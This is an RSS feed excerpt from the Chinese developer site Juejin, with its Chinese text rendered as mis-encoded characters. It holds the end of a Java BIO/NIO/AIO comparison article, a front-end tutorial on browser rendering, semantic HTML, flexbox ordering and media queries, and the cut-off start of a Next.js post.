        <span class="hljs-comment">// é˜²æ­¢ä¸»çº¿ç¨‹é€€å‡ºï¼ˆä¸»çº¿ç¨‹ä¸ç”¨å¤„ç†IOï¼Œåªè´Ÿè´£å‘èµ·è¯·æ±‚ï¼‰</span>
        <span class="hljs-keyword">try</span> {
            Thread.currentThread().join();
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h2 data-id="heading-24">ä¸‰ã€æ€»ç»“ï¼šä¸‰å¤§IOæ¨¡å‹æ ¸å¿ƒå¯¹æ¯”ï¼ˆä¸€çœ¼åˆ†æ¸…ï¼Œå¿«é€Ÿé€‰å‹ï¼‰</h2>
<p>å­¦åˆ°è¿™é‡Œï¼Œç›¸ä¿¡ä½ å·²ç»åƒé€äº†Java IOä¸‰å¤§æ¨¡å‹å’Œæ ¸å¿ƒæ¦‚å¿µã€‚æœ€åå’±ä»¬ç”¨ä¸€å¼ è¡¨æ ¼ï¼Œæ±‡æ€»ä¸‰è€…çš„æ ¸å¿ƒåŒºåˆ«ï¼Œå¸®ä½ å¿«é€Ÿé€‰å‹ï¼Œé¿å…è¸©å‘ï¼š</p>

































<table><thead><tr><th>IOæ¨¡å‹</th><th>ç±»å‹</th><th>æ ¸å¿ƒä¼˜åŠ¿</th><th>æ ¸å¿ƒåŠ£åŠ¿</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>BIO</strong></td><td>åŒæ­¥é˜»å¡</td><td>ç¼–ç¨‹ç®€å•ã€é€»è¾‘ç›´è§‚</td><td>æ•ˆç‡ä½ã€èµ„æºæµªè´¹ï¼Œä¸æ”¯æŒé«˜å¹¶å‘</td><td>ä½å¹¶å‘ã€å°æ–‡ä»¶è¯»å†™ã€ç®€å•äº¤äº’</td></tr><tr><td><strong>NIO</strong></td><td>åŒæ­¥éé˜»å¡</td><td>é«˜å¹¶å‘æ€§èƒ½ä¼˜ç§€ï¼Œèµ„æºåˆ©ç”¨ç‡é«˜</td><td>ç¼–ç¨‹å¤æ‚åº¦ä¸­ç­‰ï¼Œæœ‰è½®è¯¢å¼€é”€</td><td>é«˜å¹¶å‘ç½‘ç»œç¼–ç¨‹ï¼ˆæœåŠ¡å™¨ã€ç½‘å…³ç­‰ï¼‰</td></tr><tr><td><strong>AIO</strong></td><td>å¼‚æ­¥éé˜»å¡</td><td>æ€§èƒ½æœ€ä¼˜ï¼Œå®Œå…¨è§£æ”¾çº¿ç¨‹</td><td>ç¼–ç¨‹å¤æ‚ï¼Œå—æ“ä½œç³»ç»Ÿæ”¯æŒé™åˆ¶</td><td>å¤§æ•°æ®é‡ã€ä½å»¶è¿Ÿåœºæ™¯ï¼ˆå¤§æ–‡ä»¶ä¼ è¾“ç­‰ï¼‰</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ¬ ä»æ ‡ç­¾åˆ°å±å¹•ï¼šæ­ç§˜ç°ä»£ç½‘é¡µæ„å»ºä¸é€‚é…ä¹‹é“]]></title>    <link>https://juejin.cn/post/7604045354071244834</link>    <guid>https://juejin.cn/post/7604045354071244834</guid>    <pubDate>2026-02-09T08:29:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604045354071244834" data-draft-id="7604315965875257378" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ¬ ä»æ ‡ç­¾åˆ°å±å¹•ï¼šæ­ç§˜ç°ä»£ç½‘é¡µæ„å»ºä¸é€‚é…ä¹‹é“"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-02-09T08:29:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Leeå·"/> <meta itemprop="url" content="https://juejin.cn/user/2402874087453658"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ¬ ä»æ ‡ç­¾åˆ°å±å¹•ï¼šæ­ç§˜ç°ä»£ç½‘é¡µæ„å»ºä¸é€‚é…ä¹‹é“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2402874087453658/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Leeå·
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:29:29.000Z" title="Mon Feb 09 2026 08:29:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ¬ ä»æ ‡ç­¾åˆ°å±å¹•ï¼šæ­ç§˜ç°ä»£ç½‘é¡µæ„å»ºä¸é€‚é…ä¹‹é“</h2>
<p>å½“æ‚¨åœ¨æµè§ˆå™¨ä¸­æµç•…åœ°æ»‘åŠ¨é¡µé¢æ—¶ï¼Œä¸€åœºç”±ä»£ç é©±åŠ¨çš„ç²¾å¯†â€œè¡¨æ¼”â€æ­£åœ¨å¹•åä¸Šæ¼”ã€‚ä¸‹é¢ï¼Œè®©æˆ‘ä»¬é€šè¿‡æ‚¨æä¾›çš„å­¦ä¹ ææ–™ï¼Œä¸€æ­¥æ­¥æ‹†è§£è¿™åœºè¡¨æ¼”ï¼Œçœ‹çœ‹HTMLã€CSSå’ŒJavaScriptå¦‚ä½•ä»æ¯ç‡¥çš„æ–‡æœ¬ï¼Œèœ•å˜ä¸ºæ‚¨çœ¼å‰æ‰€è§ã€æ‰‹ä¸­æ‰€ç”¨çš„äº¤äº’ç•Œé¢ã€‚</p>
<h3 data-id="heading-1">1ï¸âƒ£ å¹•åç¬¬ä¸€æ­¥ï¼šæ­å»ºéª¨æ¶ä¸â€œä¸Šå¦†â€ï¼ˆDOM + CSSOMï¼‰</h3>
<p>æµè§ˆå™¨é¦–å…ˆé¢å¯¹çš„æ˜¯ä¸€å †æ–‡æœ¬ï¼Œå®ƒéœ€è¦å…ˆç†è§£ç»“æ„ï¼Œå†èµ‹äºˆæ ·å¼ã€‚</p>























<table><thead><tr><th>é˜¶æ®µ</th><th>åšä»€ä¹ˆ</th><th>æ ¸å¿ƒæ¯”å–»</th><th>ç¤ºä¾‹ä»£ç ï¼ˆç®€åŒ–ï¼‰</th></tr></thead><tbody><tr><td><strong>æ„å»ºDOMæ ‘</strong>â€‹</td><td>è§£æHTMLæ ‡ç­¾ï¼Œæ„å»ºæ ‘å½¢ç»“æ„ã€‚</td><td>æ­å»ºæˆ¿å±‹çš„â€œé’¢ç­‹éª¨æ¶â€ã€‚</td><td><code>1.html</code>ä¸­çš„åµŒå¥—ç»“æ„ï¼š <code>&lt;p&gt;&lt;span&gt;ä»‹ç»&lt;span&gt;æ¸²æŸ“æµç¨‹&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;</code></td></tr><tr><td><strong>æ„å»ºCSSOMæ ‘</strong>â€‹</td><td>è§£æCSSè§„åˆ™ï¼Œå½¢æˆæ ·å¼è§„åˆ™æ ‘ã€‚</td><td>è®¾è®¡æˆ¿å±‹çš„â€œè£…ä¿®å›¾çº¸â€ã€‚</td><td><code>3.html</code>ä¸­çš„è§„åˆ™ï¼š <code>#p7 { color: aqua; }</code> <code>.highlight { color: green; }</code></td></tr></tbody></table>
<p><strong>å½“éª¨æ¶ä¸å›¾çº¸ç»“åˆ</strong>ï¼Œæµè§ˆå™¨å°±ç”Ÿæˆäº†ä¸€æ£µâ€œæ¸²æŸ“æ ‘â€ï¼Œå®ƒæ¸…æ™°åœ°çŸ¥é“æ¯ä¸ªâ€œæˆ¿é—´â€ï¼ˆDOMèŠ‚ç‚¹ï¼‰è¯¥åˆ·æˆä»€ä¹ˆé¢œè‰²ï¼ˆCSSæ ·å¼ï¼‰ã€‚</p>
<p><strong>ğŸ’¡ é‡ç‚¹çŸ¥è¯†ï¼šCSSé€‰æ‹©å™¨ä¼˜å…ˆçº§</strong></p>
<p>å½“å¤šä¸ªè§„åˆ™å†²çªæ—¶ï¼Œè°è¯´äº†ç®—ï¼Ÿæœ‰ä¸€ä¸ªæ˜ç¡®çš„â€œæƒåŠ›ç­‰çº§â€ï¼š</p>
<p><code>å†…è”æ ·å¼</code>&gt; <code>IDé€‰æ‹©å™¨</code>&gt; <code>ç±»é€‰æ‹©å™¨</code>&gt; <code>æ ‡ç­¾é€‰æ‹©å™¨</code></p>
<p>åœ¨<code>3.html</code>ä¸­ï¼Œ<code>&lt;p style="color: red;" id="p7" class="highlight"&gt;</code>çš„é¢œè‰²æœ€ç»ˆä¼šæ˜¯<strong>çº¢è‰²</strong>ï¼Œå› ä¸ºå†…è”æ ·å¼æƒåŠ›æœ€å¤§ã€‚</p>
<h3 data-id="heading-2">2ï¸âƒ£ è¯­ä¹‰ä¸ç»“æ„ï¼šä¸åªæ˜¯â€œèƒ½çœ‹â€ï¼Œæ›´è¦â€œå¥½æ‡‚â€ï¼ˆè¯­ä¹‰åŒ– + SEOï¼‰</h3>
<p>å¥½çš„ä»£ç ï¼Œä¸ä»…æ˜¯ç»™æµè§ˆå™¨çœ‹çš„ï¼Œä¹Ÿæ˜¯ç»™æœç´¢å¼•æ“å’Œè¾…åŠ©è®¾å¤‡â€œè¯»â€çš„ã€‚</p>
<p><strong>ğŸ† è¯­ä¹‰åŒ–æ ‡ç­¾æ˜¯SEOçš„åˆ©å™¨</strong></p>
<p>åœ¨<code>2.html</code>ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æ¸…æ™°çš„ç°ä»£ç½‘é¡µç»“æ„ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>ç½‘é¡µå¤´éƒ¨ï¼ˆæ ‡é¢˜/å¯¼èˆªï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span>ç½‘é¡µæ ¸å¿ƒå†…å®¹åŒº<span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">aside</span>&gt;</span>ä¾§è¾¹æ ï¼ˆå¯¼èˆª/å¹¿å‘Šï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">aside</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>ç½‘é¡µåº•éƒ¨ï¼ˆç‰ˆæƒä¿¡æ¯ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
</code></pre>
<p>ä½¿ç”¨ <code>&lt;header&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;aside&gt;</code>, <code>&lt;footer&gt;</code>, <code>&lt;section&gt;</code>ç­‰æ ‡ç­¾ï¼Œèƒ½<strong>æ˜ç¡®å‘Šè¯‰æœç´¢å¼•æ“æ¯ä¸ªåŒºå—çš„ç”¨é€”</strong>ã€‚æœç´¢å¼•æ“çš„â€œèœ˜è››â€åœ¨çˆ¬å–ç½‘é¡µæ—¶ï¼Œèƒ½æ›´å‡†ç¡®åœ°ç†è§£å†…å®¹ï¼Œä»è€Œæå‡é¡µé¢åœ¨æœç´¢ç»“æœä¸­çš„æ’åã€‚</p>
<p><strong>ğŸ’¡ ä¸€ä¸ªå…³é”®çš„SEOä¸æ€§èƒ½å®è·µï¼šæºç é¡ºåºçš„é‡è¦æ€§</strong></p>
<p>åœ¨ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ä¸­ï¼Œæ‚¨ä¼šæ³¨æ„åˆ°<code>&lt;main&gt;</code>ä¸»å†…å®¹åœ¨æºç ä¸­ä½äº<code>&lt;aside&gt;</code>ä¾§è¾¹æ ä¹‹å‰ã€‚è¿™æ ·åšçš„åŸå› ä¸»è¦æœ‰ä¸¤ä¸ªï¼š</p>
<ol>
<li><strong>SEOä¼˜åŒ–</strong>ï¼šæœç´¢å¼•æ“çˆ¬è™«æŠ“å–ç½‘é¡µæ—¶ï¼Œä¼šä¼˜å…ˆè¯»å–å’Œè¯„ä¼°ä»£ç é å‰çš„å†…å®¹ã€‚å°†é‡è¦çš„<code>&lt;main&gt;</code>å†…å®¹æ”¾åœ¨å‰é¢ï¼Œæœ‰åŠ©äºæœç´¢å¼•æ“æ›´å¿«åœ°ç†è§£é¡µé¢çš„æ ¸å¿ƒä¸»é¢˜ï¼Œå¯¹æ’åæœ‰ç§¯æå½±å“ã€‚</li>
<li><strong>åŠ è½½ä¸æ¸²æŸ“æ€§èƒ½</strong>ï¼šæµè§ˆå™¨æ˜¯è‡ªä¸Šè€Œä¸‹è§£æå’Œæ¸²æŸ“HTMLçš„ã€‚é‡è¦çš„æ ¸å¿ƒå†…å®¹å…ˆè¡ŒåŠ è½½å’Œæ¸²æŸ“ï¼Œå¯ä»¥è®©ç”¨æˆ·æ›´æ—©åœ°çœ‹åˆ°é¡µé¢ä¸»ä½“ï¼Œå³ä½¿åœ¨ç½‘ç»œè¾ƒæ…¢æˆ–ä¾§è¾¹æ å†…å®¹ï¼ˆå¦‚å¹¿å‘Šã€ç¬¬ä¸‰æ–¹è„šæœ¬ï¼‰åŠ è½½å—é˜»æ—¶ï¼Œä¹Ÿèƒ½ä¿è¯åŸºæœ¬å†…å®¹çš„å¯è®¿é—®æ€§ï¼Œæå‡ç”¨æˆ·çš„â€œé¦–å±åŠ è½½â€ä½“éªŒã€‚</li>
</ol>
<p><strong>ğŸ”„ ä¸€ä¸ªç²¾å¦™çš„å¸ƒå±€æŠ€å·§ï¼š<code>order</code>å±æ€§</strong></p>
<p>è™½ç„¶æºç é¡ºåºæ˜¯<code>&lt;main&gt;</code>åœ¨å‰ï¼Œ<code>&lt;aside&gt;</code>åœ¨åï¼Œä½†åœ¨å¤§å±å¹•çš„è§†è§‰å‘ˆç°ä¸Šï¼Œæˆ‘ä»¬é€šå¸¸å¸Œæœ›ä¾§è¾¹æ æ˜¾ç¤ºåœ¨å·¦ä¾§ï¼Œè€Œä¸»å†…å®¹åœ¨å³ä¾§ã€‚è¿™çœ‹èµ·æ¥æ˜¯ä¸ªçŸ›ç›¾ï¼Œä½†Flexboxçš„<code>order</code>å±æ€§å¯ä»¥è½»æ¾è§£å†³ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> { <span class="hljs-attribute">display</span>: flex; } <span class="hljs-comment">/* åˆ›å»ºå¼¹æ€§å®¹å™¨ */</span>
<span class="hljs-selector-class">.aside-left</span> { <span class="hljs-attribute">order</span>: -<span class="hljs-number">1</span>; } <span class="hljs-comment">/* å°†å·¦ä¾§è¾¹æ çš„è§†è§‰é¡ºåºè®¾ä¸º-1 */</span>
</code></pre>
<p><strong>å®ç°åŸç†</strong>ï¼š</p>
<ul>
<li><code>display: flex;</code>å°†å®¹å™¨è®¾ä¸ºå¼¹æ€§å¸ƒå±€ã€‚</li>
<li>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼¹æ€§é¡¹ç›®çš„<code>order</code>å€¼ä¸º<code>0</code>ã€‚</li>
<li>å°†å·¦ä¾§è¾¹æ çš„<code>order</code>è®¾ä¸º<code>-1</code>ï¼Œä½¿å…¶åœ¨è§†è§‰ä¸Šæ’åˆ°æ‰€æœ‰<code>order</code>ä¸º0çš„é¡¹ç›®ï¼ˆå³<code>&lt;main&gt;</code>å’Œå³ä¾§è¾¹æ ï¼‰ä¹‹å‰ï¼Œä»è€Œå®ç°äº†â€œè§†è§‰å·¦ï¼Œä»£ç åâ€çš„å¸ƒå±€ã€‚</li>
</ul>
<h3 data-id="heading-3">3ï¸âƒ£ å“åº”å¼è®¾è®¡ï¼šä»æ¡Œé¢åˆ°æŒå¿ƒçš„æ— ç¼ä½“éªŒ</h3>
<p><strong>ğŸŒŠ å¼¹æ€§å¸ƒå±€</strong></p>
<p><code>2.html</code>é€šè¿‡ <code>display: flex;</code>åˆ›å»ºäº†å¼¹æ€§å®¹å™¨ã€‚<code>flex: 1;</code>è®© <code>&lt;main&gt;</code>å æ®æ‰€æœ‰å‰©ä½™ç©ºé—´ï¼Œè€Œ <code>&lt;aside&gt;</code>åˆ™ä¿æŒå›ºå®šå®½åº¦ã€‚è¿™æ˜¯ä¸€ç§éå¸¸çµæ´»çš„è‡ªé€‚åº”å¸ƒå±€åŸºç¡€ã€‚</p>
<p><strong>ğŸ“ å…¨å±ç©ºé—´ç®¡ç†ï¼š<code>min-height: calc(100vh - 136px);</code></strong></p>
<p>è¿™æ¡è§„åˆ™ç¡®ä¿äº†ä¸»å†…å®¹åŒºåœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½æœ‰è¶³å¤Ÿçš„é«˜åº¦ï¼š</p>
<ul>
<li><strong><code>100vh</code></strong>ï¼šä»£è¡¨æ•´ä¸ªæµè§ˆå™¨å¯è§†åŒºåŸŸçš„é«˜åº¦ã€‚</li>
<li><strong><code>- 136px</code></strong>ï¼šå‡å»å›ºå®šçš„å¤´éƒ¨å’Œåº•éƒ¨é«˜åº¦ï¼ˆå‡è®¾åˆ†åˆ«æ˜¯80pxå’Œ56pxï¼‰ã€‚</li>
<li><strong><code>calc()</code></strong> ï¼šCSSçš„è®¡ç®—å‡½æ•°ã€‚</li>
<li><strong><code>min-height</code></strong>ï¼šæœ€å°é«˜åº¦ã€‚</li>
</ul>
<p><strong>ä½œç”¨</strong>ï¼šå³ä½¿é¡µé¢å†…å®¹å¾ˆå°‘ï¼Œä¹Ÿèƒ½å°†é¡µè„šæ¨åˆ°å±å¹•åº•éƒ¨ï¼Œé¿å…ä¸‹æ–¹å‡ºç°å¤§ç‰‡ç©ºç™½ï¼Œå®ç°â€œç²˜æ€§é¡µè„šâ€æ•ˆæœã€‚</p>
<p><strong>ğŸ“± ç§»åŠ¨ç«¯é€‚é…ï¼šåª’ä½“æŸ¥è¯¢</strong></p>
<p>å½“å±å¹•å˜çª„ï¼ˆå¦‚æ‰‹æœºï¼‰ï¼Œå›ºå®šå®½åº¦çš„ä¾§è¾¹æ å°±ä¼šæ˜¾å¾—æ‹¥æŒ¤ã€‚æ­¤æ—¶ï¼Œ<strong>CSSåª’ä½“æŸ¥è¯¢</strong>å‡ºåœºæ•‘æ´ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) { <span class="hljs-comment">/* å½“å±å¹•å®½åº¦å°äº768åƒç´ æ—¶ */</span>
  <span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">flex-direction</span>: column; <span class="hljs-comment">/* æ”¹ä¸ºå‚ç›´å †å  */</span>
  }
  <span class="hljs-selector-tag">aside</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* ä¾§è¾¹æ å æ»¡å®½åº¦ */</span>
  }
  <span class="hljs-selector-class">.aside-left</span> {
    <span class="hljs-attribute">order</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* é‡æ–°è°ƒæ•´å †å é¡ºåºï¼Œåœ¨å‚ç›´æµä¸­æŒ‰æºç é¡ºåºæ˜¾ç¤º */</span>
  }
}
</code></pre>
<p>è¿™æ ·ï¼Œåœ¨æ‰‹æœºä¸Šï¼Œé¡µé¢å…ƒç´ å°±ä¼šè‡ªåŠ¨ä»ä¸Šåˆ°ä¸‹æ•´é½æ’åˆ—ï¼Œæä¾›ä¼˜ç§€çš„ç§»åŠ¨ç«¯æµè§ˆä½“éªŒã€‚</p>
<h3 data-id="heading-4">4ï¸âƒ£ æ€»ç»“</h3>
<p>æ‚¨æä¾›çš„æ–‡ä»¶æ¸…æ™°åœ°å‹¾å‹’äº†ç°ä»£å‰ç«¯å¼€å‘çš„æ ¸å¿ƒè·¯å¾„ï¼š</p>
<ol>
<li><strong>æ„å»º</strong>ï¼šç†è§£æµè§ˆå™¨å¦‚ä½•å°†HTML/CSSâ€œç¿»è¯‘â€æˆDOM/CSSOMæ ‘ï¼Œè¿™æ˜¯é¡µé¢æ¸²æŸ“çš„åŸºçŸ³ã€‚</li>
<li><strong>èµ‹èƒ½</strong>ï¼šä½¿ç”¨è¯­ä¹‰åŒ–æ ‡ç­¾ç¼–å†™HTMLï¼Œå¹¶éµå¾ªâ€œä¸»å†…å®¹ä¼˜å…ˆâ€çš„æºç é¡ºåºï¼Œè¿™å¯¹SEOå’Œæ€§èƒ½è‡³å…³é‡è¦ã€‚å†åˆ©ç”¨Flexboxçš„<code>order</code>å±æ€§ç­‰CSSæŠ€å·§ï¼Œåœ¨è§†è§‰ä¸Šå®ç°æ‰€éœ€çš„å¸ƒå±€ã€‚</li>
<li><strong>é€‚é…</strong>ï¼šåˆ©ç”¨å¼¹æ€§å¸ƒå±€ã€<code>calc()</code>å‡½æ•°å’Œåª’ä½“æŸ¥è¯¢ï¼Œæ„å»ºå‡ºæ—¢èƒ½ä¼˜é›…åˆ©ç”¨å¤§å±å¹•ç©ºé—´ï¼Œåˆèƒ½åœ¨å°å±å¹•ä¸Šå®Œç¾è‡ªé€‚åº”çš„å“åº”å¼ç•Œé¢ã€‚</li>
</ol>
<p>ä»ä»£ç åˆ°å±å¹•ï¼Œæ¯ä¸€æ­¥éƒ½è•´å«ç€å¯¹æ€§èƒ½ã€è¯­ä¹‰å’Œç”¨æˆ·ä½“éªŒçš„è€ƒé‡ã€‚æŒæ¡è¿™äº›åŸç†ï¼Œæ‚¨å°±èƒ½åˆ›é€ å‡ºæ—¢ç¾è§‚åˆé«˜æ•ˆï¼Œä¸”èƒ½é€‚åº”ä¸‡â€œç«¯â€çš„ç°ä»£åŒ–ç½‘é¡µã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js è¯·æ±‚æœ€ä½³å®è·µ - vercel 2026ä¸€æœˆå‘å¸ƒæŒ‡å—]]></title>    <link>https://juejin.cn/post/7604315965875322914</link>    <guid>https://juejin.cn/post/7604315965875322914</guid>    <pubDate>2026-02-09T08:41:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604315965875322914" data-draft-id="7603958579181076480" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js è¯·æ±‚æœ€ä½³å®è·µ - vercel 2026ä¸€æœˆå‘å¸ƒæŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,Next.js,React.js"/> <meta itemprop="datePublished" content="2026-02-09T08:41:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å´å°˜"/> <meta itemprop="url" content="https://juejin.cn/user/3389172758899188"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta 